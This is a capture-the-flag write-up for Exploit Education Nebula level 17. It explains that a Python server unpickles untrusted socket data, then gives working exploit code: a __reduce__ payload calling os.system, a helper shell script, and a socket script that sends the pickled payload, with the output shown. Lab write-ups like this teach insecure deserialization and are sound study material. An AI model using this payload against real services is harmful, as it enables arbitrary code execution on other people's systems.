### [Exploit Education Level 17](https://exploit.education/nebula/level-17/)

## Challenge
There is a python script listening on port `10007` that contains a vulnerability.

To do this level, log in as the `level17` account with the password `level17`. Files for this level can be found in `/home/flag17`.

## Vulnerability
```python
def server(skt):
  line = skt.recv(1024)

  obj = pickle.loads(line)

  for i in obj:
      clnt.send("why did you send me " + i + "?\n")
```
This program uses python `pickle` module. [Pickle Module](https://docs.python.org/2/library/pickle.html)
>The pickle module implements a fundamental, but powerful algorithm for serializing and de-serializing a Python object structure. “Pickling” is the process whereby a Python object hierarchy is converted into a byte stream, and 
>“unpickling” is the inverse operation, whereby a byte stream is converted back into an object hierarchy.

We can see a warning in the same page.
>Warning:The pickle module is not secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.  

So it is unsafe to `unpicke` untrusted data. We can see that in `server` function ,the program is `unpickiling` user provided data without any checks.  

You can read more about this vulnerability [here](https://blog.nelhage.com/2011/03/exploiting-pickle/).

So the vulnerability is that we can run our own code since python is `unpickiling` our data.
## Solution
We can write a python class that runs a script we control.
```python
import os
class Exploit(object):
  def __reduce__(self):
    return (os.system,(('/tmp/run.sh'),))
obj=Exploit()
line=pickle.dumps(obj)
```
The `__reduce__` function returns a `tuple` representing the command to be run. This `tuple` can be easily `pickled`.[Additional information on _reduce_.](https://docs.python.org/3/library/pickle.html#object.__reduce__)  
Essentially what this script does is, it returns the pickled format of the command we have to run. Here we are running the script `/tmp/run.sh`. The `pickled` result can used as the input for `flag17` program.
```bash
level17@nebula:~$ nano /tmp/run.sh
level17@nebula:~$ chmod 777 /tmp/run.sh
level17@nebula:~$ cat /tmp/run.sh
getflag>/tmp/out
```
I am running `geflag` and writing the output to a file named `/tmp/out`. I also wrote a complete python script to send the `pickled` data.
```python
#!/usr/bin/python

import pickle
import os
import socket
class Exploit(object):
  def __reduce__(self):
    return (os.system,(('/tmp/run.sh'),))
obj=Exploit()
line=pickle.dumps(obj)
HOST = "127.0.0.1"
PORT = 10007
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
s.connect((HOST,PORT))
s.recv(1024)
s.sendall(line)
print line
```
Lets run the script.
```bash
level17@nebula:~$ python pickle2
Accepted connection from 127.0.0.1:58290
cposix
system
p0
(S'/tmp/run.sh'
p1
tp2
Rp3
.
```
Check the output in `/tmp/out`
```bash
level17@nebula:~$ cat /tmp/out
You have successfully executed getflag on a target account
```
### Solved!
